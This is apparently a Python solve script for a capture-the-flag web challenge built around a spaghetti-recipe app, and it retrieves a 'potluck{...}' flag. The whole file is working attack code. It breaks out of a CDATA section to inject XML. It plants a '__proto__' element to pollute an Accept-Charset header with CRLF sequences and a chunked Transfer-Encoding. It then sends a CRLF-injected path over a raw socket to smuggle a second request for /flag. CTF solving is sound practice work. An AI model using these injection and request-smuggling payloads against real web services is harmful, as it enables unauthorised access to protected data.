import urllib.parse
import requests
import os
import sys
import socket


if (len(sys.argv) != 3):
    print("Usage: python solve.py <host> <port>")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

root = f"http://{host}:{port}"


pasta_id = os.urandom(16).hex()

def quote(s: str):
    return urllib.parse.quote_plus(s).replace("+", "%20")


def create_spaghetti(recipe):
    r = requests.get(f"{root}/spaghetti/{pasta_id}", params={"recipe": recipe})


CRLF = "\r\n"
XML_CRLF = "&#x0d;&#x0a;"

charset = f"{XML_CRLF}Transfer-Encoding:chunked{XML_CRLF}{XML_CRLF}fff{XML_CRLF}"

create_spaghetti(
    f"]]></recipe><__proto__><name>Accept-Charset</name><quantity>{charset}</quantity></__proto__> <recipe><![CDATA[  "
)


print("ID:", pasta_id)

exploit = quote(
    f"{pasta_id} HTTP/1.1{CRLF}Connection:keep-alive{CRLF}Host:a{CRLF}{CRLF}GET /flag HTTP/1.1{CRLF}Host:a{CRLF}{CRLF}.json"
)


# The response is kinda messed up so a socket is used instead of requests  ¯\_(ツ)_/¯

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))

try:
    # Send data
    message = f"GET /download/{exploit} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    sock.sendall(message.encode('utf-8'))

    # Look for the response
    data = sock.recv(4048)
    data += sock.recv(4048)
    r = data.decode('utf-8')

    start = r.index("potluck{")
    end = r.index("}", start)

    print("FLAG:", r[start:end + 1])

finally:
    sock.close()
    